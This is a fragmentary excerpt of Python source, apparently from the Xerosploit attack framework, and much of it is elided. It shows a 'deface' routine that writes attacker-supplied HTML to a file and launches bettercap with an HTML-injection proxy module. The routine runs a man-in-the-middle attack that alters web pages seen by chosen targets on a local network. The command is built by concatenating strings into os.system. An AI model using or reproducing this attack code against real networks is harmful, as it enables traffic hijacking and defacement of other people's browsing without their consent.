...
# Line done by Guilherme Vieira Galvão
raw_input = input
						...
						def deface():
							...
							if action_deface == "back":
								...
								if file_deface == "back":
									...
									f1 = open('~/xero-html.html','w')
									f1.write(content)
									f1.close()

									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file ~/xero-html.html -I " + up_interface + " --gateway " + gateway )
									deface()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								deface()
